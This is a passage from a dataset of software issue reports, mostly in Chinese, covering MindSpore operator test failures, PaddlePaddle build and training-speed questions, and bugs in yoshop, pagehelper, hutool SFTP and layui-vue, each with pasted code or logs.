array([0.3099384, 7.8721294, 4.0036 ], dtype=float32) data_me = array([0.11511384, 7.8700275 , 2.3151083 ], dtype=float32) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.3099384 4.0036 ] E data_me_error:[0.11511384 2.3151083 ] E loss:[0.19482456 1.6884918 ] def test_uniformcandidatesampler_remove_accidental_hits_false(): fact = UniformCandidateSamplerFactory( 3, np.int32, 3, 4, False, 5, 6, remove_accidental_hits=False ) &gt; fact.forward_cmp() ../operations/test_uniformcandidatesampler.py:122: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/uniformcandidatesampler_ops.py:91: in forward_cmp allclose_nparray(out_me[0], out_me2[0], self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([0, 3, 2, 3], dtype=int32) data_me = array([0, 1, 1, 0], dtype=int32), rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[3 2 3] E data_me_error:[1 1 0] E loss:[2 1 3]"
建议在菜单设置页面增加菜单项的query参数配置,如果是低代码设计的表单，它的URL是 也就是说菜单还有参数一起决定一个页面。但目前在菜单的设置中，只能设置url，并不能带query参数。 而在this.tabs.open方法中实际是可以带这个参数的，也就是说，建议在菜单设置页面增加菜单项的query参数配置，在实现打开功能的时候，把这个参数再传出去，很少的代码就可以实现对左侧目录打开特定“低代码设计的表单页面”。对快速开发的意义很大哦。   <code>: /formSubmit?id=0431a578-bfc9-407f-b95e-321c350f10cb
查看商品所有评价报错,"代码是26号最新版，手动执行了2.0.1版的sql。   <code>: [2021-03-28T19:15:49+08:00][error] [8]compact(): Undefined variable: total [D:\web\yoshop\yoshop2.0\app\api\controller\Comment.php:38] #0 [internal function]: think\initializer\Error-&gt;appError(8, 'compact(): Unde...', 'D:\\web\\yoshop\\y...', 38, Array) #1 D:\web\yoshop\yoshop2.0\app\api\controller\Comment.php(38): compact('list', 'total') #2 [internal function]: app\api\controller\Comment-&gt;list(10003, -1) #3 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Container.php(343): ReflectionMethod-&gt;invokeArgs(Object(app\api\controller\Comment), Array) #4 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\route\dispatch\Controller.php(110): think\Container-&gt;invokeReflectMethod(Object(app\api\controller\Comment), Object(ReflectionMethod), Array) #5 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(59): think\route\dispatch\Controller-&gt;think\route\dispatch\{closure}(Object(app\Request)) #6 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(66): think\Pipeline-&gt;think\{closure}(Object(app\Request)) #7 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\route\dispatch\Controller.php(113): think\Pipeline-&gt;then(Object(Closure)) #8 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\route\Dispatch.php(89): think\route\dispatch\Controller-&gt;exec() #9 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Route.php(772): think\route\Dispatch-&gt;run() #10 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(59): think\Route-&gt;think\{closure}(Object(app\Request)) #11 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(66): think\Pipeline-&gt;think\{closure}(Object(app\Request)) #12 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Route.php(773): think\Pipeline-&gt;then(Object(Closure)) #13 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Http.php(216): think\Route-&gt;dispatch(Object(app\Request), NULL) #14 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Http.php(206): think\Http-&gt;dispatchToRoute(Object(app\Request)) #15 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(59): think\Http-&gt;think\{closure}(Object(app\Request)) #16 D:\web\yoshop\yoshop2.0\vendor\topthink\think-multi-app\src\MultiApp.php(71): think\Pipeline-&gt;think\{closure}(Object(app\Request)) #17 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(59): think\app\MultiApp-&gt;think\app\{closure}(Object(app\Request)) #18 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(66): think\Pipeline-&gt;think\{closure}(Object(app\Request)) #19 D:\web\yoshop\yoshop2.0\vendor\topthink\think-multi-app\src\MultiApp.php(72): think\Pipeline-&gt;then(Object(Closure)) #20 [internal function]: think\app\MultiApp-&gt;handle(Object(app\Request), Object(Closure)) #21 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Middleware.php(142): call_user_func(Array, Object(app\Request), Object(Closure)) #22 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(85): think\Middleware-&gt;think\{closure}(Object(app\Request), Object(Closure)) #23 D:\web\yoshop\yoshop2.0\vendor\topthink\think-trace\src\TraceDebug.php(71): think\Pipeline-&gt;think\{closure}(Object(app\Request)) #24 [internal function]: think\trace\TraceDebug-&gt;handle(Object(app\Request), Object(Closure)) #25 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Middleware.php(142): call_user_func(Array, Object(app\Request), Object(Closure)) #26 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(85): think\Middleware-&gt;think\{closure}(Object(app\Request), Object(Closure)) #27 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Pipeline.php(66): think\Pipeline-&gt;think\{closure}(Object(app\Request)) #28 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Http.php(207): think\Pipeline-&gt;then(Object(Closure)) #29 D:\web\yoshop\yoshop2.0\vendor\topthink\framework\src\think\Http.php(170): think\Http-&gt;runWithRequest(Object(app\Request)) #30 D:\web\yoshop\yoshop2.0\public\index.php(15): think\Http-&gt;run() #31 {main}"
build failed due to blas missing of deps,"error msg: http://172.19.32.197:8111/viewLog.html?tab=buildLog&amp;logTab=tree&amp;filter=debug&amp;expand=all&amp;buildId=34973&amp;_focus=2164   <code>: [11:01:37] [Step 1/4] [ 13%] Building CXX object paddle/fluid/operators/math/CMakeFiles/blas.dir/blas.cc.o [11:01:38] [Step 1/4] In file included from /paddle/paddle/fluid/framework/tensor.h:26:0, [11:01:38] [Step 1/4] from /paddle/paddle/fluid/framework/mixed_vector.h:21, [11:01:38] [Step 1/4] from /paddle/paddle/fluid/framework/lod_tensor.h:28, [11:01:38] [Step 1/4] from /paddle/paddle/fluid/framework/operator.h:28, [11:01:38] [Step 1/4] from /paddle/paddle/fluid/operators/math/blas.h:17, [11:01:38] [Step 1/4] from /paddle/paddle/fluid/operators/math/blas.cc:15: [11:01:38] [Step 1/4] /paddle/paddle/fluid/platform/device_context.h:26:22: fatal error: mkldnn.hpp: No such file or directory [11:01:38] [Step 1/4] #include &lt;mkldnn.hpp&gt; [11:01:38] [Step 1/4] ^ [11:01:38] [Step 1/4] compilation terminated."
[CT][MS][OCCM][atan2][api mapping] The example in api mapping document of pytorch_diff.atan2 has error.,"The example in api mapping document of atan2 has error The example in api mapping document of atan2 has error / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph atan2 api映射样例： 使用doctest测试样例 Ascend、GPU、CPU结果不一致，确认是否为bug，并修改用例   <code>: # PyTorch import numpy as np import torch from torch import tensor input = torch.tensor(np.array([2]), dtype=torch.float32) other = torch.tensor(np.array([1, 1]), dtype=torch.int) output = torch.atan2(input, other).numpy() print(output) # [1.1071488 1.1071488] # MindSpore import numpy as np import mindspore import mindspore.ops as ops from mindspore import Tensor x = Tensor(np.array([2]), mindspore.float32) y = Tensor(np.array([1, 1]), mindspore.float32) output = ops.atan2(x, y) print(output) # [1.1071488 1.1071488] Expecting: [1.1071488 1.1071488] ********************************************************************** File ""/home/jenkins-slave/workspace/ME_Excutor_DOC_Daily_EulerOS_A_K_Server_OpenSource/test_log/example_testing_temp.py"", line 21, in example_testing_temp Failed example: print(output) Expected: [1.1071488 1.1071488] Got: [1.1071492 1.1071492] ********************************************************************** 1 items had failures: 1 of 15 in example_testing_temp 15 tests in 1 items. 14 passed and 1 failed. ***Test Failed*** 1 failures. ==================== 1 failed in 1minutes ======================"
[MS][NET][EPP-MVSNet][GPU 1p]network train failed,": /device gpu : -- MindSpore version :commit_id:a6fade32b1b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_ms_epp_mvsnet_train_infer.py get code from model_zoo sh eval.sh network train failed network train success EPP-MVSNet网络在GPU环境训练失败   <code>: [ERROR] DEBUG(74031,7f765cfcd700,python):2021-08-24-14:42:55.840.646 [mindspore/ccsrc/debug/trace.cc:128] TraceGraphEval] [ERROR] ANALYZER(74031,7f765cfcd700,python):2021-08-24-14:42:55.855.316 [mindspore/ccsrc/pipeline/jit/static_analysis/async_eval_result.cc:39] HandleException] Exception happened, check the information as below. The function call stack (See file '/ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/rank_0/om/analyze_fail.dat' for more details): # 0 In file /ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/src/eppmvsnet.py(356) for i in range(feat_pack_1.shape[1] - 1): # 1 In file /ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/src/eppmvsnet.py(359) if pixel_distance &lt; self.distance * 3: # 2 In file /ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/src/eppmvsnet.py(360) cost_volume_1 = self.stage1_p2_s1([ref_feat_1, srcs_feat_1, proj_mats[:, :, 2]], ^ # 3 In file /ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/src/eppmvsnet.py(234) cost_volume = self.cost_compression(cost_volume) ^ # 4 In file /ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/src/networks.py(189) x = self.basicblock_0(x) ^ # 5 In file /ms/zjc/workspace/solution_test/remaining/test_scripts/mindspore/net/eppmvsnet/eppmvsnet/src/networks.py(168) x = self.conv3d_0(x) ^ # 6 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/conv.py(637) if self.has_bias: # 7 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/conv.py(636) output = self.conv3d(x, self.weight) ^ 0%| | 0/915 [00:04&lt;?, ?it/s] Traceback (most recent call last): File ""validate.py"", line 129, in &lt;module&gt; results = EPPMVSNet_eval(imgs, proj_mats, init_depth_min, depth_interval) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 384, in __call__ out = self.compile_and_run(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 634, in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 536, in compile result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 526, in __infer__ out[track] = fn(*(x[track] for x in args)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/operations/nn_ops.py"", line 8085, in infer_shape validator.check(f""x_shape[1] // group"", x_shape[1] // self.group, ""w_shape[1]"", w_shape[1], Rel.EQ, self.name) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/_checkparam.py"", line 226, in check raise excp_cls(f'{msg_prefix} `{arg_name}` should be {rel_str}, but got {arg_value}.') ValueError: For 'Conv3D' the `x_shape[1] // group` should be == w_shape[1]: 8, but got 32."
[CT][MS][GPU-choleskysolve]API has some issue ,"资料没有说明X1和x2 dtype要求一致 / 硬件环境: /device ascend/GPU/CPU/ : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph API资料说明 检查API资料 API说明完整， 正确 没有说明两个输入dtype必须一致   <code>: Inputs: - **x1** (Tensor) - Tensor of shape :math:`(*, N, M)`, indicating 2D or 3D matrices, with float32 or float64 data type. - **x2** (Tensor) - Tensor of shape :math:`(*, N, N)`, indicating 2D or 3D square matrices composed of upper or lower triangular Cholesky factor, with float32 or float64 data type."
<section>标签换行符丢失,在html网页上用section标签，复制到dzx编辑器里，换行符丢失 aaa bbb   <code>: &lt;section&gt;aaa&lt;/section&gt;&lt;section&gt;bbb&lt;/section&gt;
msCountMap.get(ms.getId()); 返回null 导致执行空指针异常,"com.github.pagehelper:pagehelper:4.0.1   <code>: if (page.isCount()) { COUNT.set(Boolean.TRUE); //替换MS args[0] = msCountMap.get(ms.getId()); // 这行代码返回空导致 invocation.proceed();出现截图的错误 //查询总数 Object result = invocation.proceed(); //还原ms args[0] = ms; //设置总数 page.setTotal((Integer) ((List) result).get(0)); if (page.getTotal() == 0) { return page; } } public &lt;E&gt; List&lt;E&gt; query(MappedStatement ms, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler) throws SQLException { BoundSql boundSql = ms.getBoundSql(parameterObject); // args[0] 为空导致 ms 是空 CacheKey key = createCacheKey(ms, parameterObject, rowBounds, boundSql); return query(ms, parameterObject, rowBounds, resultHandler, key, boundSql); }"
[MS][1.7]不同平台梯度计算不一致[AICC],"简要 backbone使用se_resnext50官方与训练权重与代码，对后续特征图进行上采样和卷积进行语义分割任务，现网络计算梯度不同平台差异很大，NPU平台梯度计算有误，导致同样代码在GPU平台上可收敛，但NPU平台无法收敛且Loss不稳定甚至增大。 代码仓库链接：https://github.com/GavinTechStudio/rsipac_seg_backup 测试 网络统一加载训练得到的权重，用于固定网络权重。 固定输入网络的数据 inputs : (2, 3, 128, 128) masks : (2, 1, 128, 128) 输出部分前向传播结果 输出损失值 输出第一层参数梯度 输出中间某层参数梯度 梯度测试代码： CPU CPU: i5 12600h Python: 3.9 MindSpore: 1.7.1   <code>: weights/seresnext50_unet_epoch1_on_npu.ckpt import argparse import mindspore as ms import numpy as np from mindspore import Tensor, context from mindspore.nn import Adam, WithLossCell from src.Criterion import Criterion from src.se_resnext50 import seresnext50_unet from src.trainWithGrads import TrainOneStepCellWithGrad def get_args(): parser = argparse.ArgumentParser(description='Training') parser.add_argument('--device_target', default='Ascend', type=str) return parser.parse_args() args = get_args() context.set_context(mode=context.GRAPH_MODE, device_target=args.device_target) net = seresnext50_unet( resolution=(128, 128), deepsupervision=True, clfhead=False, clf_threshold=None, load_pretrained=False ) param_dict = ms.load_checkpoint('weights/seresnext50_unet_epoch1_on_npu.ckpt') ms.load_param_into_net(net, param_dict) criterion = Criterion(deepsupervision=True, clfhead=False) net_with_loss = WithLossCell(backbone=net, loss_fn=criterion) opt = Adam(params=net_with_loss.get_parameters()) model = TrainOneStepCellWithGrad(network=net_with_loss, optimizer=opt) inputs = np.load(""inputs.npy"") masks = np.load(""masks.npy"") inputs = Tensor(inputs, ms.float32) masks = Tensor(masks, ms.float32) train_loss, grads = model(inputs, masks) out = net(inputs) print(out[0][0, 0, :10, :10]) print(train_loss.asnumpy()) print(grads[0][0][0].asnumpy()) print(grads[300].asnumpy())"
sftp下载报错 No such File,"JDK版本： openjdk_8_201 hutool版本： 5.7.7 下载文件报错No such file,但是去服务器上用命令登陆sftp后又能下载   <code>: //ssftpftp = new Sftp(config); Session session = JschUtil.createSession(config.getHost(),config.getPort(),config.getUser(),config.getPassword()); sftp = JschUtil.createSftp(session); log.info(""SFTP连接成功""); //文件路径 byte[] decoded = Base64.getDecoder().decode(path); path = new String(decoded); try{ JSONObject object = new JSONObject(path); if(object.containsKey(""file_path"")){ path = object.getStr(""file_path""); } }catch (JSONException e){ e.toString(); } log.info(""SFTP文件路径:{}"",path); //从文件路径中获取文件名 String fileName = FileUtil.getName(path); log.info(""SFTP文件名:{}"",fileName); String temp = tempPath + FileUtil.FILE_SEPARATOR + fileName; boolean exist = FileUtil.exist(tempPath); if(!exist){ FileUtil.mkdir(tempPath); log.info(""本地缓存文件夹{}不存在，新建缓存文件夹"",tempPath); } //创建一个缓存文件 File tempFile = new File(temp); //将sftp文件下载到缓存文件中 log.info(""开始下载SFTP文件""); sftp.download(path,tempFile); log.info(""SFTP文件：{}，下载到缓存文件成功"",fileName);"
CDN方式引入，table 表格数据不显示,"CDN方式引入，table 表格标题可以呈现，数据不显示，演示代码如下： HTML5:   <code>: &lt;!-- 引入 layui-vue 样式 --&gt; &lt;link rel=""stylesheet"" type=""text/css"" href=""https://unpkg.com/@layui/layui-vue/lib/index.css""&gt; &lt;!-- 引入 Vue 3, 使用全局变量 Vue --&gt; &lt;script src=""https://unpkg.com/vue@3""&gt;&lt;/script&gt; &lt;!-- 引入 layui-vue 组件库, 使用全局变量 LayuiVue --&gt; &lt;script src=""https://unpkg.com/@layui/layui-vue""&gt;&lt;/script&gt; &lt;div id=""app""&gt; &lt;lay-container fluid=""true""&gt; &lt;lay-table :columns=""userColumns"" :dataSource=""userList""&gt; &lt;/lay-table&gt; &lt;/lay-container&gt; &lt;/div&gt; &lt;script&gt; const {createApp, ref, watch, reactive} = Vue; const {layer} = LayuiVue; const App = { setup() { const userColumns = [ { title: ""账户"", titleSlot: ""username-title"", customSlot: ""username"", key: ""username"", align: ""left"" }, { title: ""密码"", customSlot: ""password"", key: ""password"", align: ""center"" }, { title: ""年龄"", key: ""age"", sort: true, align: ""right"" }, { title: ""备注"", key: ""remark"", ellipsisTooltip: true, } , { title: ""操作"", width: ""100px"", customSlot: ""operator"", key: ""operator"" } ]; const userList = [ { id: ""1"", username: ""root"", password: '**', age: ""18"", remark: 'layui - vue（谐音：类 UI) 是 一 套 Vue 3.0 的 桌 面 端 组 件 库.layui - vue（谐音：类 UI) 是 一 套 Vue 3.0 的 桌 面 端 组 件 库.' }, { id: ""2"", username: ""woow"", password: '**', age: ""20"", remark: 'layui - vue（谐音：类 UI) 是 一 套 Vue 3.0 的 桌 面 端 组 件 库.layui - vue（谐音：类 UI) 是 一 套 Vue 3.0 的 桌 面 端 组 件 库.' } ]; return { userColumns, userList, } } }; const app = createApp(App); app.use(LayuiVue); app.mount('#app'); &lt;/script&gt; &lt;/html&gt;"
大规模离散化稀疏特征模型的训练耗时问题,"原本一直使用LR模型作为CTR预估模型，最近正在调研LearningToRank模型（PaddlePaddle/models/ltr），随后便开始了对Paddle的学习。目前，遇到的最大问题是一轮训练（one pass）时间过长。 使用相同数据规模（7亿样本）、相同特征方案（离散化后的0/1稀疏特征3亿维）、相同cpu集群（40个节点），使用owlqn或LBFGS做优化的传统LR模型**# 训练60轮平均耗时2小时**，而使用Paddle实现的LR模型仅**# 训练一轮就需要超过3小时**。 以下是我使用Paddle实现的LR模型： 优化算法选用Adam，配置代码如下： 对于上面这个没有任何隐层的模型，目前的训练耗时已经无法接受，导致使用LearningToRank模型替代传统LR模型的方案也无法继续开展。 另外，我还在本地使用小数据集做了测试（1500W样本，feature_dim=3亿，batch_size=5W），及时小数据集训练一轮的平均耗时也仍在1.5个小时。 我需要请教的问题主要有三个： 1）是什么原因导致我模型训练耗时这么长？是否与我的模型配置有关？ 2）从我的实验结果上来看，Paddle训练一轮的耗时基本是传统owlqn实现的四五十倍。这是正常的现象吗？... 3）对于大规模离散数据的模型优化，Paddle同学们有什么建议吗？   <code>: def lr(input_dim): # label layer label = paddle.layer.data(""label"", paddle.data_type.dense_vector(1)) # data layer data = paddle.layer.data(""data"", paddle.data_type.sparse_binary_vector(input_dim)) # sigmoid output = paddle.layer.fc( input=data, size=1, act=paddle.activation.Sigmoid(), param_attr=paddle.attr.Param(initial_std=0.01, name=""output"")) # cost layer cost = paddle.layer.multi_binary_label_cross_entropy_cost(input=output, label=label) return cost trainer = paddle.trainer.SGD( cost=cost, parameters=parameters, update_equation=paddle.optimizer.Adam(learning_rate=1e-3), is_local=True)"
Wrong LaTeX format in operator documentation,"For an example, in we have https://github.com/PaddlePaddle/Paddle/blob/32b10d3bc4f269ff0c253df163db72d10454d4d5/paddle/operators/lrn_op.cc#L91-L96 This violates the rule of LaTex in Markdown -- math equations must follow the starting $$, but not on the second line. This violation leads to wrong rendering of the equation on paddlepaddle.org: This issue is the same as https://github.com/PaddlePaddle/PaddlePaddle.org/issues/339   <code>: lrn_op.cc"
"{init_program,program} => {startup_program,main_program}","According to the terminology of C/C++ programming languages, the program that initializes global variables is known as the <em>startup program</em>, where as the function is known as the <em>entrance</em> or <em>main program</em>.   <code>: main"
[MS][DUMP]910 环境下model_zoo yolov4-darknet53 网络模型单卡训练，对顶层cell设置set_dump，dump下来的数据缺少Min/MaximumGrad算子,"/ 硬件环境: /device ascend : -- MindSpore version ::''[sha1]:3fa86724,[branch]:(HEAD-&gt;master,origin/master,origin/HEAD)' -- Python version :Python 3.7.6 -- OS platform and distribution :eulerosv2r8 -- GCC/Compiler version : (/): /mode pynative /mode graph 从models仓复制 yolov4-darknet53 网络脚本 向网络脚本插入set_dump代码，对顶层cell设置set_dump，开启dump功能，dump_mode设置为2 执行整网训练脚本 训练成功 成功dump所有算子的数据 dump下来的数据，缺少Min/Maximum算子   <code>: MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2604 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2727 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2850 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2923 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2931 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2946 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op2953 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3130 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3138 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3153 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3160 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3352 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3360 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3375 MaximumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMaximum_MaximumGrad-op3382 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2570 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2602 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2693 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2725 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2816 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2848 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2919 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2927 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op2950 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op3126 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op3134 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op3157 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op3348 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op3356 MinimumGrad.Gradients_Default_network-YoloWithLossCell_loss_small-YoloLossBlock_giou-Giou_gradMinimum_MinimumGrad-op3379"
Migrate private registry server to bcc,"Migrate the private registry server to bcc: Deploy the private registry server on bcc. Change the domain from to and also the document, TeamCity.   <code>: docker.paddlepaddle.org docker.paddlepaddlehub.com"
[CT][MS][UnsortedSegmentProd] The testcase of UnsortedSegmentProd has error.,"The testcase of UnsortedSegmentProd has error The testcase of UnsortedSegmentProd has error 用例在CPU、Ascend上报错行为不一致 用例有精度问题 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_unsortedsegmentprod_error1 CPU报错： ValueError: For 'UnsortedSegmentProd', segment_ids value should be [0,1) Ascend不报错 标杆不报错 test_unsortedsegmentprod_error2 CPU报错： ValueError: For 'UnsortedSegmentProd', segment_ids value should be [0,2) Ascend不报错 标杆报错“tensorflow.python.framework.errors_impl.InvalidArgumentError: segment_ids[0] = 2 is out of range [0, 2)” test_unsortedsegmentprod_error3 CPU偶现精度问题： test_unsortedsegmentprod_error4仅在Ascend+Pynative模式报错： RuntimeError: Sync stream failed:Ascend_7 test_unsortedsegmentprod_error5 CPU报错，有精度问题   <code>: def test_unsortedsegmentprod_error1(): input1 = np.array([[1, 2, 3], [4, 5, 6], [4, 2, 1]]).astype(np.int32) segments = np.array([0, 1, 1]).astype(np.int32) num_segments = 1 net = UnsortedSegmentProd() fact = AnyNetFactory(net=net) out1 = fact(Tensor(input1), Tensor(segments), num_segments) def test_unsortedsegmentprod_error2(): input_list = [] input_list.append(Tensor(np.random.randn(3, 4).astype(np.float16), dtype=mstype.float16)) input_list.append(Tensor([2, 1, 4], dtype=mstype.int32)) input_list.append(2) fact = UnsortedSegmentProdMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_unsortedsegmentprod_error3(): input_list = [] input_list.append(Tensor(np.random.randn(4, 3, 2).astype(np.uint8), dtype=mstype.uint8)) input_list.append(Tensor([0, 0, 1, 2], dtype=mstype.int32)) input_list.append(3) fact = UnsortedSegmentProdMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_unsortedsegmentprod_error4(): input_list = [] input_list.append(Tensor(np.random.randint(1, 50, size=(5, 7, 8, 2)).astype(np.uint16), dtype=mstype.uint16)) input_list.append(Tensor([0, 0, 1, 2, 3], dtype=mstype.int64)) input_list.append(4) fact = UnsortedSegmentProdMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_unsortedsegmentprod_error5(): input_list = [] input_list.append(Tensor( np.random.randint(-1000, 1000, size=(5, 8, 2, 13)) + 1j * np.random.randn(5, 8, 2, 13), dtype=mstype.complex128)) input_list.append(Tensor([0, 0, 1, 2, 3], dtype=mstype.int64)) input_list.append(4) fact = UnsortedSegmentProdMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def test_unsortedsegmentprod_error3(): input_list = [] input_list.append(Tensor(np.random.randn(4, 3, 2).astype(np.uint8), dtype=mstype.uint8)) input_list.append(Tensor([0, 0, 1, 2], dtype=mstype.int32)) input_list.append(3) fact = UnsortedSegmentProdMock(inputs=input_list) fact.forward_cmp() &gt; fact.grad_cmp() test_unsorted_segment_prod.py:38: _ _ _ _ _ _ _ _ 